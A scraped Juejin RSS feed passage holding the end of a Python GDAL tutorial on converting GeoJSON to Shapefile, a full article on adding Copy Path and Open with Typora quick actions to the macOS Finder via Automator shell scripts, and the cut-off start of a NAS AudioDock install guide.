class="hljs-selector-attr">[-75.608015,-48.673773]</span>,<span class="hljs-selector-attr">[-75.18277,-47.711919]</span>,<span class="hljs-selector-attr">[-74.126581,-46.939253]</span>,<span class="hljs-selector-attr">[-75.644395,-46.647643]</span>,<span class="hljs-selector-attr">[-74.692154,-45.763976]</span>,<span class="hljs-selector-attr">[-74.351709,-44.103044]</span>,<span class="hljs-selector-attr">[-73.240356,-44.454961]</span>,<span class="hljs-selector-attr">[-72.717804,-42.383356]</span>,<span class="hljs-selector-attr">[-73.3889,-42.117532]</span>,<span class="hljs-selector-attr">[-73.701336,-43.365776]</span>,<span class="hljs-selector-attr">[-74.331943,-43.224958]</span>,<span class="hljs-selector-attr">[-74.017957,-41.794813]</span>,<span class="hljs-selector-attr">[-73.677099,-39.942213]</span>,<span class="hljs-selector-attr">[-73.217593,-39.258689]</span>,<span class="hljs-selector-attr">[-73.505559,-38.282883]</span>,<span class="hljs-selector-attr">[-73.588061,-37.156285]</span>,<span class="hljs-selector-attr">[-73.166717,-37.12378]</span>,<span class="hljs-selector-attr">[-72.553137,-35.50884]</span>,<span class="hljs-selector-attr">[-71.861732,-33.909093]</span>,<span class="hljs-selector-attr">[-71.43845,-32.418899]</span>,<span class="hljs-selector-attr">[-71.668721,-30.920645]</span>,<span class="hljs-selector-attr">[-71.370083,-30.095682]</span>,<span class="hljs-selector-attr">[-71.489894,-28.861442]</span>,<span class="hljs-selector-attr">[-70.905124,-27.64038]</span>,<span class="hljs-selector-attr">[-70.724954,-25.705924]</span>,<span class="hljs-selector-attr">[-70.403966,-23.628997]</span>,<span class="hljs-selector-attr">[-70.091246,-21.393319]</span>,<span class="hljs-selector-attr">[-70.16442,-19.756468]</span>,<span class="hljs-selector-attr">[-70.372572,-18.347975]</span>,<span class="hljs-selector-attr">[-69.858444,-18.092694]</span>,<span class="hljs-selector-attr">[-69.590424,-17.580012]</span>,<span class="hljs-selector-attr">[-69.100247,-18.260125]</span>,<span class="hljs-selector-attr">[-68.966818,-18.981683]</span>,<span class="hljs-selector-attr">[-68.442225,-19.405068]</span>,<span class="hljs-selector-attr">[-68.757167,-20.372658]</span>,<span class="hljs-selector-attr">[-68.219913,-21.494347]</span>]]]}},
]}
</code></pre>
<h2 data-id="heading-3">3. 导入依赖</h2>
<p><code>GeoJSON</code>作为一种矢量数据格式，可以使用矢量库<code>OGR</code>进行处理，以实现<code>GeoJSON</code>数据从文本格式转换为<code>Shp</code>格式。其中还涉及坐标定义，所以还需要引入<code>osr</code>模块。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">from</span> osgeo <span class="hljs-keyword">import</span> ogr,osr
<span class="hljs-keyword">import</span> os
</code></pre>
<h2 data-id="heading-4">4. 数据读取与转换</h2>
<p>定义一个方法<code>GeoJSON2Shp(geoPath,shpPath)</code>用于将<code>GeoJSON</code>数据转换为<code>Shp</code>数据。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
说明：将 GeoJSON 文件转换为 Shapfile 文件
参数：
    -geoPath：GeoJSON 文件路径
    -shpPath：Shp 文件路径
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">GeoJSON2Shp</span>(<span class="hljs-params">geoPath,shpPath</span>):
</code></pre>
<p>在进行<code>GeoJSON</code>数据格式转换之前，需要检查数据路径是否存在。</p>
<pre><code class="hljs language-lua" lang="lua"># 检查文件是否存在
<span class="hljs-keyword">if</span> <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.exists(geoPath):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"GeoJSON 文件存在。"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"GeoJSON 文件不存在，请重新选择文件！"</span>)
    <span class="hljs-keyword">return</span>
</code></pre>
<p>打开<code>GeoJSON</code>数据。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 打开JSON文件</span>
<span class="hljs-attr">jsonDataSource</span> = ogr.Open(geoPath)
<span class="hljs-attr">jsonLayer</span> = jsonDataSource.GetLayer()
</code></pre>
<p>使用<code>os.path.exists</code>方法检查<code>Shp</code>文件是否已经创建，如果存在则将其删除。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">if</span> os.path.exists(shpPath):
    <span class="hljs-keyword">try</span>:
        shpDriver.DeleteDataSource(shpPath)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"文件已删除！"</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"文件删除出错：<span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<p>通过<code>GetDriverByName</code>获取<code>Shp</code>数据驱动，并创建<code>Shp</code>数据源。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建Shp数据源</span>
<span class="hljs-attr">shpDriver</span> = ogr.GetDriverByName(<span class="hljs-string">"ESRI Shapefile"</span>)
<span class="hljs-attr">shpDataSource</span> = shpDriver.CreateDataSource(shpPath)
</code></pre>
<p>添加<code>Shp</code>图层属性。获取源数据坐标系、属性字段以及几何对象，并将其复制到目标图层中。属性结构显示如下：<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f123ef5434cc4d1dad710c1ffb48788f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619384&amp;x-signature=%2B4xZj01G5CrncOwDgdM8ncg%2FpL8%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 获取坐标系</span>
<span class="hljs-attr">srs</span> = jsonLayer.GetSpatialRef()

<span class="hljs-comment"># 创建Shp数据图层</span>
<span class="hljs-attr">shpLayer</span> = shpDataSource.CreateLayer(
    "layer",
    <span class="hljs-attr">srs</span>=srs,
    <span class="hljs-attr">geom_type</span>=jsonLayer.GetGeomType()
)

<span class="hljs-comment"># 获取字段属性</span>
<span class="hljs-attr">layerDefn</span> = jsonLayer.GetLayerDefn()
for i in range(layerDefn.GetFieldCount()):
    <span class="hljs-attr">fieldDefn</span> = layerDefn.GetFieldDefn(i)
    shpLayer.CreateField(fieldDefn)

<span class="hljs-comment"># 获取几何属性</span>
for feature in jsonLayer:
    shpLayer.CreateFeature(feature)
</code></pre>
<p>在数据读取完成之后关闭数据源。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 关闭数据源</span>
<span class="hljs-attr">jsonDataSource</span> = shpDataSource = None
</code></pre>
<p>数据转换完成之后在<code>ArcMap</code>中打开的显示效果：<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93226aef513840bfac6fe98834b79590~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619384&amp;x-signature=cxR97BsjasfnHzlEai79YIOivBk%3D" alt="" loading="lazy"/>数据属性：<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14d7e064233b4a89a32f900ce2c95382~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619384&amp;x-signature=4243R2q9un3kSrjMH0wRAUqHUak%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[拒绝臃肿！不装第三方软件，给 Mac 右键菜单加上这些神仙功能]]></title>    <link>https://juejin.cn/post/7589110783146442786</link>    <guid>https://juejin.cn/post/7589110783146442786</guid>    <pubDate>2025-12-29T13:41:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589110783146442786" data-draft-id="7589093939656736820" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="拒绝臃肿！不装第三方软件，给 Mac   右键菜单加上这些神仙功能"/> <meta itemprop="keywords" content="Mac"/> <meta itemprop="datePublished" content="2025-12-29T13:41:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="也无风雨也雾晴"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            拒绝臃肿！不装第三方软件，给 Mac   右键菜单加上这些神仙功能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    也无风雨也雾晴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T13:41:48.000Z" title="Mon Dec 29 2025 13:41:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Mac 右键菜单添加自定义操作：复制路径、用指定应用打开</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f13231973e73434c8870918a74427aee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lmf5peg6aOO6Zuo5Lmf6Zu-5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767620508&amp;x-signature=kOBRFv31YUWGGdQvIHp5Jxy%2B70M%3D" alt="image.png" loading="lazy"/></p>
<p>在 Finder 里右键一个文件，想复制它的完整路径，发现没有这个选项。</p>
<p>想用 Typora 打开一个 Markdown 文件，得先打开 Typora，再把文件拖进去，或者右键 → 打开方式 → 选应用，步骤有点多。</p>
<p>这两个需求用 macOS 自带的 Automator 就能实现，不用装第三方软件。</p>
<h3 data-id="heading-1">创建"复制路径"操作</h3>
<ol>
<li>打开 <strong>Automator</strong>（Spotlight 搜索 <code>Automator</code>）</li>
<li>新建文稿，选择 <strong>快速操作</strong></li>
<li>右上角配置：
<ul>
<li>"工作流程收到当前" → <strong>文件或文件夹</strong></li>
<li>"位于" → <strong>访达.app</strong></li>
</ul>
</li>
<li>左侧搜索"运行 Shell 脚本"，拖到右边工作区</li>
<li>配置脚本：
<ul>
<li>"传递输入" → <strong>作为自变量</strong></li>
<li>Shell → <code>/bin/zsh</code></li>
<li>脚本内容：</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span>; <span class="hljs-keyword">do</span>
  <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"<span class="hljs-variable">$f</span>"</span> | pbcopy
<span class="hljs-keyword">done</span>
</code></pre>
<ol start="6">
<li><code>Cmd + S</code> 保存，命名为 <code>复制路径</code></li>
</ol>
<h3 data-id="heading-2">创建"用 Typora 打开"操作</h3>
<p>步骤一样，只是脚本不同：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span>; <span class="hljs-keyword">do</span>
  open -a <span class="hljs-string">"Typora"</span> <span class="hljs-string">"<span class="hljs-variable">$f</span>"</span>
<span class="hljs-keyword">done</span>
</code></pre>
<p>保存时命名为 <code>用 Typora 打开</code>。</p>
<p>想用其他应用打开，把 <code>Typora</code> 换成对应的应用名就行，比如 <code>Visual Studio Code</code>、<code>Sublime Text</code>。</p>
<h3 data-id="heading-3">使用方式</h3>
<p>保存后，右键任意文件 → <strong>服务</strong> 或 <strong>快速操作</strong>，就能看到刚才创建的操作了。</p>
<p>第一次使用可能会弹出权限请求，允许就行。</p>
<h3 data-id="heading-4">设置键盘快捷键（可选）</h3>
<p>嫌每次要点两层菜单麻烦，可以给操作绑定快捷键：</p>
<p><strong>系统设置 → 键盘 → 键盘快捷键 → 服务 → 文件和文件夹</strong></p>
<p>找到你创建的操作，点右边的"添加快捷键"，比如给"复制路径"设置 <code>Cmd + Shift + C</code>。</p>
<p>以后选中文件直接按快捷键，路径就复制到剪贴板了。</p>
<h3 data-id="heading-5">管理和删除</h3>
<p>创建的快速操作保存在 <code>~/Library/Services/</code> 目录下，每个是一个 <code>.workflow</code> 文件夹。</p>
<p>想删除某个操作，直接删对应的 <code>.workflow</code> 文件夹就行：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">rm</span> -rf ~/Library/Services/复制路径.workflow
</code></pre>
<p>或者在 Finder 里按 <code>Cmd + Shift + G</code>，输入 <code>~/Library/Services/</code>，手动删除。</p>
<h3 data-id="heading-6">补充：复制多个文件路径</h3>
<p>如果想同时选中多个文件，复制所有路径（每行一个），脚本改成：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">'%s\n'</span> <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span> | pbcopy
</code></pre>
<h3 data-id="heading-7">原生方法的局限</h3>
<p>用 Automator 创建的操作只能出现在"服务"或"快速操作"子菜单里，没法直接加到右键菜单顶层。</p>
<p>想加到顶层，得用第三方工具：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fiboysoft.com%2Fmagic-menu%2F" target="_blank" title="https://iboysoft.com/magic-menu/" ref="nofollow noopener noreferrer">iBoysoft MagicMenu</a> - 免费版够用</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Flangui.net%2Fcontext-menu%2F" target="_blank" title="https://langui.net/context-menu/" ref="nofollow noopener noreferrer">Context Menu</a> - 付费，功能更强</li>
</ul>
<p>不过对我来说，设个快捷键就够了，不需要额外装软件。</p>
<hr/>
<p>如果你觉得这篇文章有帮助，欢迎关注我的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">GitHub</a>，下面是我的一些开源项目：</p>
<p><strong>Claude Code Skills</strong>（按需加载，意图自动识别，不浪费 token，<a href="https://juejin.cn/post/7578714735307735066" target="_blank" title="https://juejin.cn/post/7578714735307735066">介绍文章</a>）：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> - 代码审查技能，覆盖 React 19、Vue 3、TypeScript、Rust 等约 9000 行规则（<a href="https://juejin.cn/post/7578709098255908902" target="_blank" title="https://juejin.cn/post/7578709098255908902">详细介绍</a>）</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2F5-whys-skill" target="_blank" title="https://github.com/tt-a1i/5-whys-skill" ref="nofollow noopener noreferrer">5-whys-skill</a> - 5 Whys 根因分析，说"找根因"自动激活</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Ffirst-principles-skill" target="_blank" title="https://github.com/tt-a1i/first-principles-skill" ref="nofollow noopener noreferrer">first-principles-skill</a> - 第一性原理思考，适合架构设计和技术选型</li>
</ul>
<p><strong>vibe coding 原理学习</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcoding-cli-guide" target="_blank" title="https://github.com/tt-a1i/coding-cli-guide" ref="nofollow noopener noreferrer">coding-cli-guide</a>（<a href="https://link.juejin.cn?target=https%3A%2F%2Ftt-a1i.github.io%2Fcoding-cli-guide%2F%3Ftab%3Dstart-here" target="_blank" title="https://tt-a1i.github.io/coding-cli-guide/?tab=start-here" ref="nofollow noopener noreferrer">学习网站</a>）- 学习 qwen-cli 时整理的笔记，40+ 交互式动画演示 AI CLI 内部机制</li>
</ul>
<p><strong>全栈项目</strong>（适合学习现代技术栈）：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fprompt-vault" target="_blank" title="https://github.com/tt-a1i/prompt-vault" ref="nofollow noopener noreferrer">prompt-vault</a> - Prompt 管理器，用的都是最新的技术栈，适合用来学习了解最新的前端全栈开发范式：Next.js 15 + React 19 + tRPC 11 + Supabase 全栈示例，clone 下来配个免费 Supabase 就能跑</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fchat_edit" target="_blank" title="https://github.com/tt-a1i/chat_edit" ref="nofollow noopener noreferrer">chat_edit</a> - 双模式 AI 应用（聊天+富文本编辑），Vue 3.5 + TypeScript + Vite 5 + Quill 2.0 + IndexedDB</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[绿联云 NAS 安装 AudioDock 详细教程]]></title>    <link>https://juejin.cn/post/7589052659436486702</link>    <guid>https://juejin.cn/post/7589052659436486702</guid>    <pubDate>2025-12-29T13:54:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589052659436486702" data-draft-id="7589092567544971273" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="绿联云 NAS 安装 AudioDock 详细教程"/> <meta itemprop="keywords" content="前端,Docker,容器"/> <meta itemprop="datePublished" content="2025-12-29T13:54:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="萌萌哒草头将军"/> <meta itemprop="url" content="https://juejin.cn/user/1116759543260727"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            绿联云 NAS 安装 AudioDock 详细教程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1116759543260727/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    萌萌哒草头将军
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T13:54:38.000Z" title="Mon Dec 29 2025 13:54:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA6CAYAAAAOeSEWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAABkLSURBVGhDtZoHnJ1llcbP3Om9ZiYzmfSQhCQQIbRQVQKI9CYC68qKriJK0UXcZRcINqStIoiIqKCi1NACQihBWiCkkJ5MJlMyvd7p7d759v989/sy34yTbIj48Atz71ff855znvOc971xDrB/EtoGI7a9Z8Aq+wZML0mNj7dE95NZ1OKsj1dHo1GbnJpss9OTbWJyonvun4VP1Njuoagtb+m0it4By0iIt8LEeMvkr8XFWcfgkA1gYDLf47i2PzpsyU7UspKSLDoctagTZ7Vc08MzClMS7awJ2ZaflBB78CeET8TYla1dtrKt2w5KS7YCDGzEoz2RqKUmhGw6x2bhuXyOp2BoRXef1Q1E7Lj8TIsMD1sbxu1kcnYSAX1810RMTUmyMB7f2j1gC7NS7byinNiL/kH8Q8a+2NRh77b32El56VaPAe0YeGR2mh2bm+FdMRqP1rbZe+3dFsHT35qcb/Oz0rwzo7Gxs9feYPLS4kM2h8lawee5hPmlJXneFQeGAzJ2F564v7rFzi7Msu3d/Xgjzq5g8ArX8VCNN2vJ28daey0zZJabmGCLslP5HOf+Oygr3UzDGOf+JxrauXfQjslJt+dbuuyMgiwmk+sPAB/b2Lt2NdoMZnuY21qHIvbvUyZ4Z0ZQiXGrWjvsmPxsK4R0nmHA8ZCTQvxVQn5eRipklIBtcVbV1WtHYsjati47ZWKuTUpP9Z4yGk/xDBGe3v1mW4/dOrvYO7P/2G9jRSjf31FnXyaUXiB8r51WaJkM3kcfOSa2FR6qarIenooTLQHPLcC4mYThyw1tVpKWYlVERlZ8nC3Oz3Jzdn1nn5uvQ8OOHYvhR/CvsqffJbkCkZTvcYZ6Z0WTfTovw5Y1dtjXp+TbFPhgf7FfxpYxuMfr2uwo8rEtMmwXF+d6Z8wGmIR2PLyjo8cqOFffP2SLGexJEJCP9R29thkPXlpa4A5Y3w/jmuVNYYwO2QkY7WMtz3mVcE1hkualJdmSolzX8GnpKd4VZq80d1o7zN0RdWxGaqItgbn3B/+vsasgh/UMNBOvzYMZDxtDKp289KGaVguFQvb1yQWWwuB97GaSXqUUnVaYbSUwr